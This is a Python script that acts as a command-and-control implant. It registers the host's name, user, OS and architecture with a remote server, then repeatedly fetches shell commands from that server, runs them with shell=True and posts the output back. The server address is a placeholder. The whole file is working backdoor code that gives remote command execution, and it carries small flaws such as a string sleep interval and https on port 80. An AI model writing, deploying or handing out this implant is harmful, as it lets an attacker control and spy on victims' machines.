import os
import platform
import socket
import time
import requests
import subprocess

SERVER_IP = "127.0.0.1"
SERVER_PORT = "80"
WAITTIME = "1"

HOSTNAME = socket.gethostname()
USER = os.getlogin()
OS = platform.system()
VERSION = platform.release()

# Get architecture using 'uname -m' (this works on Linux)
try:
    ARCH = subprocess.check_output("uname -m", shell=True).decode().strip()
except subprocess.CalledProcessError:
    ARCH = "Unknown"

ID = f"{USER}@{HOSTNAME}"
SERVER = f"https://{SERVER_IP}:{SERVER_PORT}"

# Register the client with the server
def register_client():
    data = {
        "id": ID,
        "hostname": HOSTNAME,
        "username": USER,
        "os": OS,
        "version": VERSION,
        "arch": ARCH
    }
    try:
        response = requests.post(f"{SERVER}/register", data=data)
        response.raise_for_status()
        print(f"Client registered successfully.")
    except requests.RequestException as e:
        print(f"Failed to register client: {e}")
        exit(1)

# Send command result to the server
def send_result(command, result):
    data = {
        "cmd": command,
        "result": result
    }
    try:
        response = requests.post(f"{SERVER}/{ID}/result", data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send result: {e}")

# Main command loop
def command_loop():
    while True:
        try:
            # Request the command from the server
            response = requests.get(f"{SERVER}/{ID}.html")
            response.raise_for_status()
            cmd = response.text.strip()

            if cmd:
                if cmd == "exit":
                    print("Received exit command. Terminating client...")
                    break

                # Execute the command
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    result = result.decode("utf-8")
                except subprocess.CalledProcessError as e:
                    result = e.output.decode("utf-8")

                # Send the result back to the server
                send_result(cmd, result)

            time.sleep(WAITTIME)

        except requests.RequestException as e:
            print(f"Error while communicating with server: {e}")
            time.sleep(1)

if __name__ == "__main__":
    register_client()
    command_loop()
